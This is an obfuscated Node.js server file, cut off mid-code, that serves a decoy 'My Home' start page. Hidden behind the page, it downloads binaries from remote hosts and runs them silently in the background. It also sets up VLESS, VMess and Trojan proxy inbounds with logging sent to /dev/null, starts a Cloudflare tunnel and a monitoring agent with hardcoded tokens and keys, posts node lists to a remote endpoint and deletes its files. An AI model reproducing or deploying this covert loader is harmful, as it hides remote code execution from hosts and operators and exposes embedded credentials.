const _0x1707e5=_0x48e1;(function(_0x360371,_0x5ca500){const _0x4e5c5b=_0x48e1,_0x3b2179=_0x360371();while(!![]){try{const _0x2c41da=-parseInt(_0x4e5c5b(0x16e))/0x1*(parseInt(_0x4e5c5b(0x171))/0x2)+-parseInt(_0x4e5c5b(0x1e3))/0x3+parseInt(_0x4e5c5b(0x15c))/0x4+-parseInt(_0x4e5c5b(0x170))/0x5+-parseInt(_0x4e5c5b(0x150))/0x6+parseInt(_0x4e5c5b(0x16b))/0x7+-parseInt(_0x4e5c5b(0x1c5))/0x8*(-parseInt(_0x4e5c5b(0x1a7))/0x9);if(_0x2c41da===_0x5ca500)break;else _0x3b2179['push'](_0x3b2179['shift']());}catch(_0x23dc84){_0x3b2179['push'](_0x3b2179['shift']());}}}(_0x3b67,0x1f90d));const express=require(_0x1707e5(0x15a)),app=express(),axios=require(_0x1707e5(0x1c6)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x1707e5(0x1a3)),exec=promisify(require('child_process')[_0x1707e5(0x1e5)]),{execSync}=require(_0x1707e5(0x1c3)),API_ENDPOINT=process[_0x1707e5(0x194)][_0x1707e5(0x19f)]||'',SERVICE_BASE_URL=process[_0x1707e5(0x194)][_0x1707e5(0x156)]||'',AUTO_ENABLE=process[_0x1707e5(0x194)][_0x1707e5(0x1eb)]||![],DATA_DIR=process[_0x1707e5(0x194)][_0x1707e5(0x16d)]||_0x1707e5(0x19a),API_PATH=process[_0x1707e5(0x194)][_0x1707e5(0x183)]||'api/qianxiuadmin',SERVER_PORT=process[_0x1707e5(0x194)]['SERVER_PORT']||process['env'][_0x1707e5(0x190)]||0xbb8,SERVICE_ID=process[_0x1707e5(0x194)][_0x1707e5(0x1cb)]||_0x1707e5(0x1a9),MONITOR_SERVER=process[_0x1707e5(0x194)][_0x1707e5(0x163)]||_0x1707e5(0x19e),MONITOR_PORT=process[_0x1707e5(0x194)][_0x1707e5(0x165)]||'',MONITOR_KEY=process[_0x1707e5(0x194)][_0x1707e5(0x15d)]||_0x1707e5(0x1de),GATEWAY_DOMAIN=process['env'][_0x1707e5(0x1ea)]||_0x1707e5(0x1d9),GATEWAY_AUTH=process[_0x1707e5(0x194)][_0x1707e5(0x1b9)]||'eyJhIjoiMTlmOGI1NWVlOGY3NjA4ZmY0YzdmZGY2OTM0YzdmZDciLCJ0IjoiMGVlNjkxYzAtMjYyZS00OGVlLWIzYzYtZmFlOGRiMWJhOGE1IiwicyI6Ik5EVTVORFExWm1VdFpXSmpZaTAwTkRGbExXSmpOV1F0WWpneFpEaG1ZVEpsWm1GaiJ9',GATEWAY_PORT=process[_0x1707e5(0x194)][_0x1707e5(0x18c)]||0x1f43,PROXY_HOST=process['env'][_0x1707e5(0x17f)]||_0x1707e5(0x17d),PROXY_PORT=process['env'][_0x1707e5(0x1c9)]||0x1bb,SERVICE_NAME=process['env'][_0x1707e5(0x18d)]||'',LANDING_PAGE_HTML=_0x1707e5(0x1ad);!fs[_0x1707e5(0x1b0)](DATA_DIR)&&fs[_0x1707e5(0x1d5)](DATA_DIR);function generateRandomName(){const _0x4a76dc=_0x1707e5,_0x118e27=_0x4a76dc(0x162);let _0x5d963b='';for(let _0x4c4a1b=0x0;_0x4c4a1b<0x6;_0x4c4a1b++){_0x5d963b+=_0x118e27['charAt'](Math[_0x4a76dc(0x14e)](Math[_0x4a76dc(0x193)]()*_0x118e27['length']));}return _0x5d963b;}const serviceA=generateRandomName(),serviceB=generateRandomName(),gatewayService=generateRandomName(),monitorService=generateRandomName();let serviceAPath=path[_0x1707e5(0x1e2)](DATA_DIR,serviceA),monitorServicePath=path['join'](DATA_DIR,monitorService),serviceBPath=path[_0x1707e5(0x1e2)](DATA_DIR,serviceB),gatewayServicePath=path['join'](DATA_DIR,gatewayService),endpointsPath=path['join'](DATA_DIR,_0x1707e5(0x182)),inventoryPath=path['join'](DATA_DIR,'inventory.txt'),serviceLogPath=path[_0x1707e5(0x1e2)](DATA_DIR,_0x1707e5(0x17c)),gatewayConfigPath=path['join'](DATA_DIR,_0x1707e5(0x1ab));app[_0x1707e5(0x18b)]('/',function(_0x2f429c,_0x290160){const _0x40dbbb=_0x1707e5;_0x290160['set'](_0x40dbbb(0x1b7),_0x40dbbb(0x1df)),_0x290160[_0x40dbbb(0x1d3)](LANDING_PAGE_HTML);});function cleanupEndpoints(){const _0x31e507=_0x1707e5;try{if(!API_ENDPOINT)return;if(!fs[_0x31e507(0x1b0)](endpointsPath))return;let _0x712a06=fs['readFileSync'](endpointsPath,_0x31e507(0x1d7));const _0x4f94c2=Buffer[_0x31e507(0x1e7)](_0x712a06,_0x31e507(0x157))[_0x31e507(0x192)](_0x31e507(0x1d7)),_0x435014=_0x4f94c2['split']('\x0a')[_0x31e507(0x1dd)](_0x5544e7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x31e507(0x1c2)](_0x5544e7));if(_0x435014[_0x31e507(0x179)]===0x0)return;axios[_0x31e507(0x1bb)](API_ENDPOINT+_0x31e507(0x14f),JSON[_0x31e507(0x1a6)]({'nodes':_0x435014}),{'headers':{'Content-Type':_0x31e507(0x178)}})[_0x31e507(0x18e)](()=>null);}catch(_0x1c2b1d){}}function _0x3b67(){const _0x36937e=['tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','SERVICE_BASE_URL','base64','&path=%2Fapi%2Fv1%2Fpipe%3Fed%3D2560#','then','express','&fp=firefox&type=ws&host=','629512MqvXxE','MONITOR_KEY','arm64','readFileSync','includes','text/plain;\x20charset=utf-8','abcdefghijklmnopqrstuvwxyz','MONITOR_SERVER','\x0a\x20\x20\x20\x20service:\x20http://localhost:','MONITOR_PORT','has','set','close','freedom','unshift','1804943YmZnkM','/api/v1/pipe','DATA_DIR','193433ivdncN','\x0atls:\x20','288350GSbqjs','2QQmVQm','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','unlinkSync','firefox','stream','message','arm','application/json','length','\x0a\x0atrojan://','.ssss.nyc.mn/bot','service.log','www.visa.cn','TunnelSecret','PROXY_HOST','tunnel:\x20','2053','endpoints.txt','API_PATH','2096','amd','.ssss.nyc.mn/','trojan','listen','clear','none','get','GATEWAY_PORT','SERVICE_NAME','catch','createWriteStream','PORT','\x0acredentials-file:\x20','toString','random','env','log','8443','https://ipapi.co/json/','https+local://8.8.8.8/dns-query','\x0a\x20\x20-\x20service:\x20http_status:404','./tmp','vless','127.0.0.1','\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','jk.qianxiu.xx.kg:8008','API_ENDPOINT','agent','tunnel\x20--config\x20','/tunnel.yml\x20run','util','statSync','arch','stringify','63KostJa','writeFileSync','afa95317-a9e2-49d0-bba8-06efb190081a','\x20>/dev/null\x202>&1\x20&','gateway.json','.ssss.nyc.mn/web','\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22zh-CN\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20<title>My\x20Home</title>\x0a\x20\x20\x20\x20<script\x20src=\x22https://unpkg.com/lucide@latest\x22></script>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20:root\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--bg:\x20#f0f2f5;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--text:\x20#2d3436;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--card-bg:\x20rgba(255,\x20255,\x20255,\x200.8);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--accent:\x20#6c5ce7;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20*\x20{\x20margin:\x200;\x20padding:\x200;\x20box-sizing:\x20border-box;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27PingFang\x20SC\x27,\x20-apple-system,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20var(--bg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-image:\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(at\x200%\x200%,\x20rgba(108,\x2092,\x20231,\x200.05)\x200px,\x20transparent\x2050%),\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(at\x20100%\x20100%,\x20rgba(0,\x20184,\x20148,\x200.05)\x200px,\x20transparent\x2050%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20min-height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20var(--text);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#greeting\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x200.9rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20letter-spacing:\x202px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-transform:\x20uppercase;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.5;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x208px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#clock\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x204rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20letter-spacing:\x20-2px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2090%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20550px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2060px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-box\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20var(--card-bg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2010px\x2030px\x20rgba(0,0,0,0.05);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2018px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20outline:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-box:focus\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1.02);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2020px\x2040px\x20rgba(0,0,0,0.08);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#fff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-wrap:\x20wrap;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20inherit;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20var(--card-bg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20var(--accent);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-10px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20i\x20{\x20margin-bottom:\x2010px;\x20width:\x2024px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20span\x20{\x20font-size:\x2012px;\x20font-weight:\x20500;\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<div\x20id=\x22greeting\x22>HELLO</div>\x0a\x20\x20\x20\x20<div\x20id=\x22clock\x22>00:00</div>\x0a\x20\x20\x20\x20<div\x20class=\x22search-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<form\x20action=\x22https://www.google.com/search\x22\x20method=\x22get\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20name=\x22q\x22\x20class=\x22search-box\x22\x20placeholder=\x22Search...\x22\x20autofocus\x20autocomplete=\x22off\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</form>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22nav-container\x22\x20id=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://github.com\x22\x20class=\x22nav-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20data-lucide=\x22github\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>GitHub</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://notion.so\x22\x20class=\x22nav-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20data-lucide=\x22book-open\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>Notion</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://bilibili.com\x22\x20class=\x22nav-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20data-lucide=\x22tv\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>Bilibili</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</a>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20lucide.createIcons();\x0a\x20\x20\x20\x20\x20\x20\x20\x20function\x20update()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20now\x20=\x20new\x20Date();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20h\x20=\x20now.getHours();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20m\x20=\x20String(now.getMinutes()).padStart(2,\x20\x270\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27clock\x27).textContent\x20=\x20h\x20+\x20\x22:\x22\x20+\x20m;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20let\x20greet\x20=\x20\x22Good\x20Evening\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(h\x20<\x2012)\x20greet\x20=\x20\x22Good\x20Morning\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20else\x20if\x20(h\x20<\x2018)\x20greet\x20=\x20\x22Good\x20Afternoon\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27greeting\x27).textContent\x20=\x20greet;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20setInterval(update,\x201000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20update();\x0a\x20\x20\x20\x20</script>\x0a</body>\x0a</html>\x0a','error','fileUrl','existsSync','xtls-rprx-vision','country_code','tls','amd64','&path=%2Fapi%2Fv1%2Fstream%3Fed%3D2560#','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Content-Type','data','GATEWAY_AUTH','\x20-p\x20','post','vmess','--tls','tcp','split','Download\x20','\x20-s\x20','test','child_process','http','156072VlqrwU','axios','\x20-c\x20','?encryption=none&security=tls&sni=','PROXY_PORT','Unknown','SERVICE_ID','/api/add-subscriptions','\x20--loglevel\x20info\x20--url\x20http://localhost:','chmodSync','match','unlink','2083','Error\x20downloading\x20files:','send','org','mkdirSync','map','utf-8','443','koyeb1.0407123.xyz','\x0a\x0avmess://','client_secret:\x20','https://','filter','tWSZ7FQDZuV2wlCshjCddTNsV4Fb9Z5p','text/html','quic','2087','join','288507hPYggc','/api/v1/channel?ed=2560','exec','all','from','nohup\x20','config.yaml','GATEWAY_DOMAIN','AUTO_ENABLE','forEach','/api/v1/channel','/api/v1/stream','block','finish','aarch64','floor','/api/delete-nodes','451350vxvktG','isFile','basename','fileName','\x20successfully'];_0x3b67=function(){return _0x36937e;};return _0x3b67();}function _0x48e1(_0x22c455,_0x5a9fc1){_0x22c455=_0x22c455-0x14e;const _0x3b67ee=_0x3b67();let _0x48e1b8=_0x3b67ee[_0x22c455];return _0x48e1b8;}function cleanupData(){const _0x18d187=_0x1707e5;try{const _0x54605=fs['readdirSync'](DATA_DIR);_0x54605[_0x18d187(0x1ec)](_0x5c5b41=>{const _0x3e7ab5=_0x18d187,_0x1c97f7=path[_0x3e7ab5(0x1e2)](DATA_DIR,_0x5c5b41);try{if(fs[_0x3e7ab5(0x1a4)](_0x1c97f7)[_0x3e7ab5(0x151)]())fs[_0x3e7ab5(0x173)](_0x1c97f7);}catch(_0x2f309e){}});}catch(_0x2777e9){}}async function buildServiceConfig(){const _0x394d1d=_0x1707e5,_0x14c409={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x394d1d(0x18a)},'inbounds':[{'port':GATEWAY_PORT,'protocol':_0x394d1d(0x19b),'settings':{'clients':[{'id':SERVICE_ID,'flow':_0x394d1d(0x1b1)}],'decryption':_0x394d1d(0x18a),'fallbacks':[{'dest':0xbb9},{'path':'/api/v1/stream','dest':0xbba},{'path':'/api/v1/channel','dest':0xbbb},{'path':_0x394d1d(0x16c),'dest':0xbbc}]},'streamSettings':{'network':_0x394d1d(0x1be)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x394d1d(0x19b),'settings':{'clients':[{'id':SERVICE_ID}],'decryption':_0x394d1d(0x18a)},'streamSettings':{'network':'tcp','security':_0x394d1d(0x18a)}},{'port':0xbba,'listen':_0x394d1d(0x19c),'protocol':_0x394d1d(0x19b),'settings':{'clients':[{'id':SERVICE_ID,'level':0x0}],'decryption':_0x394d1d(0x18a)},'streamSettings':{'network':'ws','security':_0x394d1d(0x18a),'wsSettings':{'path':_0x394d1d(0x1ee)}},'sniffing':{'enabled':!![],'destOverride':[_0x394d1d(0x1c4),_0x394d1d(0x1b3),_0x394d1d(0x1e0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x394d1d(0x19c),'protocol':_0x394d1d(0x1bc),'settings':{'clients':[{'id':SERVICE_ID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x394d1d(0x1ed)}},'sniffing':{'enabled':!![],'destOverride':[_0x394d1d(0x1c4),'tls',_0x394d1d(0x1e0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x394d1d(0x19c),'protocol':_0x394d1d(0x187),'settings':{'clients':[{'password':SERVICE_ID}]},'streamSettings':{'network':'ws','security':_0x394d1d(0x18a),'wsSettings':{'path':_0x394d1d(0x16c)}},'sniffing':{'enabled':!![],'destOverride':[_0x394d1d(0x1c4),_0x394d1d(0x1b3),_0x394d1d(0x1e0)],'metadataOnly':![]}}],'dns':{'servers':[_0x394d1d(0x198)]},'outbounds':[{'protocol':_0x394d1d(0x169),'tag':'direct'},{'protocol':'blackhole','tag':_0x394d1d(0x1ef)}]};fs[_0x394d1d(0x1a8)](gatewayConfigPath,JSON[_0x394d1d(0x1a6)](_0x14c409,null,0x2));}function getArch(){const _0x43cf6d=_0x1707e5,_0x454c01=os[_0x43cf6d(0x1a5)]();return _0x454c01==='arm'||_0x454c01==='arm64'||_0x454c01===_0x43cf6d(0x1f1)?_0x43cf6d(0x177):_0x43cf6d(0x185);}function fetchFile(_0x1bdd7f,_0x37423e,_0x2b29db){const _0xd2b928=_0x1707e5,_0x25632d=fs[_0xd2b928(0x18f)](_0x1bdd7f);axios({'method':_0xd2b928(0x18b),'url':_0x37423e,'responseType':_0xd2b928(0x175)})[_0xd2b928(0x159)](_0x5f003b=>{const _0x30e7fa=_0xd2b928;_0x5f003b[_0x30e7fa(0x1b8)]['pipe'](_0x25632d),_0x25632d['on'](_0x30e7fa(0x1f0),()=>{const _0x29fa6a=_0x30e7fa;_0x25632d[_0x29fa6a(0x168)](),console[_0x29fa6a(0x195)](_0x29fa6a(0x1c0)+path[_0x29fa6a(0x152)](_0x1bdd7f)+_0x29fa6a(0x154)),_0x2b29db(null,_0x1bdd7f);}),_0x25632d['on']('error',_0x100f67=>{const _0x30f5a1=_0x30e7fa;fs[_0x30f5a1(0x1d0)](_0x1bdd7f,()=>{}),_0x2b29db(_0x100f67[_0x30f5a1(0x176)]);});})['catch'](_0x4eb577=>_0x2b29db(_0x4eb577[_0xd2b928(0x176)]));}async function fetchAndStartServices(){const _0x1edc8a=_0x1707e5,_0x416a72=getArch(),_0x1e989a=getArchSpecificFiles(_0x416a72);if(_0x1e989a[_0x1edc8a(0x179)]===0x0)return;const _0x3579de=_0x1e989a[_0x1edc8a(0x1d6)](_0x159121=>{return new Promise((_0x58df3e,_0x3973e2)=>{const _0x5c6e75=_0x48e1;fetchFile(_0x159121[_0x5c6e75(0x153)],_0x159121[_0x5c6e75(0x1af)],(_0x2bcd87,_0x222dec)=>{if(_0x2bcd87)_0x3973e2(_0x2bcd87);else _0x58df3e(_0x222dec);});});});try{await Promise[_0x1edc8a(0x1e6)](_0x3579de);}catch(_0x1a5108){console[_0x1edc8a(0x1ae)](_0x1edc8a(0x1d2),_0x1a5108);return;}const _0xd14d0a=MONITOR_PORT?[serviceAPath,serviceBPath,gatewayServicePath]:[monitorServicePath,serviceBPath,gatewayServicePath];_0xd14d0a['forEach'](_0x360806=>{const _0x154245=_0x1edc8a;if(fs['existsSync'](_0x360806))fs[_0x154245(0x1ce)](_0x360806,0x1fd);});if(MONITOR_SERVER&&MONITOR_KEY){if(!MONITOR_PORT){const _0x330c50=MONITOR_SERVER[_0x1edc8a(0x160)](':')?MONITOR_SERVER[_0x1edc8a(0x1bf)](':')['pop']():'',_0x2cb657=new Set([_0x1edc8a(0x1d8),_0x1edc8a(0x196),_0x1edc8a(0x184),'2087',_0x1edc8a(0x1d1),'2053'])[_0x1edc8a(0x166)](_0x330c50)?'true':'false',_0x847e6c=_0x1edc8a(0x1db)+MONITOR_KEY+'\x0adisable_auto_update:\x20true\x0aserver:\x20'+MONITOR_SERVER+_0x1edc8a(0x16f)+_0x2cb657+'\x0auuid:\x20'+SERVICE_ID;fs['writeFileSync'](path[_0x1edc8a(0x1e2)](DATA_DIR,_0x1edc8a(0x1e9)),_0x847e6c),await exec(_0x1edc8a(0x1e8)+monitorServicePath+'\x20-c\x20\x22'+DATA_DIR+_0x1edc8a(0x1b6));}else{let _0x24da02=[_0x1edc8a(0x1d8),_0x1edc8a(0x196),'2096',_0x1edc8a(0x1e1),_0x1edc8a(0x1d1),_0x1edc8a(0x181)][_0x1edc8a(0x160)](MONITOR_PORT)?_0x1edc8a(0x1bd):'';await exec('nohup\x20'+serviceAPath+_0x1edc8a(0x1c1)+MONITOR_SERVER+':'+MONITOR_PORT+_0x1edc8a(0x1ba)+MONITOR_KEY+'\x20'+_0x24da02+_0x1edc8a(0x19d));}}await exec('nohup\x20'+serviceBPath+_0x1edc8a(0x1c7)+gatewayConfigPath+_0x1edc8a(0x1aa));if(fs[_0x1edc8a(0x1b0)](gatewayServicePath)){let _0x22f57b=GATEWAY_AUTH[_0x1edc8a(0x1cf)](/^[A-Z0-9a-z=]{120,250}$/)?_0x1edc8a(0x155)+GATEWAY_AUTH:GATEWAY_AUTH['match'](/TunnelSecret/)?_0x1edc8a(0x1a1)+DATA_DIR+_0x1edc8a(0x1a2):'tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+serviceLogPath+_0x1edc8a(0x1cd)+GATEWAY_PORT;await exec(_0x1edc8a(0x1e8)+gatewayServicePath+'\x20'+_0x22f57b+_0x1edc8a(0x1aa));}}function getArchSpecificFiles(_0x481c59){const _0x3b8f55=_0x1707e5;let _0x3a7758=[{'fileName':serviceBPath,'fileUrl':'https://'+(_0x481c59==='arm'?'arm64':_0x3b8f55(0x1b4))+_0x3b8f55(0x1ac)},{'fileName':gatewayServicePath,'fileUrl':_0x3b8f55(0x1dc)+(_0x481c59===_0x3b8f55(0x177)?_0x3b8f55(0x15e):_0x3b8f55(0x1b4))+_0x3b8f55(0x17b)}];if(MONITOR_SERVER&&MONITOR_KEY){const _0x19201b=MONITOR_PORT?_0x3b8f55(0x1a0):'v1';_0x3a7758[_0x3b8f55(0x16a)]({'fileName':MONITOR_PORT?serviceAPath:monitorServicePath,'fileUrl':_0x3b8f55(0x1dc)+(_0x481c59===_0x3b8f55(0x177)?_0x3b8f55(0x15e):'amd64')+_0x3b8f55(0x186)+_0x19201b});}return _0x3a7758;}function configureGateway(){const _0x590748=_0x1707e5;if(!GATEWAY_AUTH||!GATEWAY_DOMAIN||!GATEWAY_AUTH['includes'](_0x590748(0x17e)))return;fs[_0x590748(0x1a8)](path[_0x590748(0x1e2)](DATA_DIR,'tunnel.json'),GATEWAY_AUTH);const _0x221111=_0x590748(0x180)+GATEWAY_AUTH[_0x590748(0x1bf)]('\x22')[0xb]+_0x590748(0x191)+path['join'](DATA_DIR,'tunnel.json')+_0x590748(0x172)+GATEWAY_DOMAIN+_0x590748(0x164)+GATEWAY_PORT+_0x590748(0x199);fs[_0x590748(0x1a8)](path[_0x590748(0x1e2)](DATA_DIR,'tunnel.yml'),_0x221111);}async function extractHostnames(){const _0x33e1e7=_0x1707e5;if(GATEWAY_AUTH&&GATEWAY_DOMAIN)await generateServiceEndpoints(GATEWAY_DOMAIN);else try{if(!fs[_0x33e1e7(0x1b0)](serviceLogPath))return;const _0x58caa1=fs[_0x33e1e7(0x15f)](serviceLogPath,'utf-8'),_0xb6e5c7=_0x58caa1[_0x33e1e7(0x1cf)](/https?:\/\/([^ 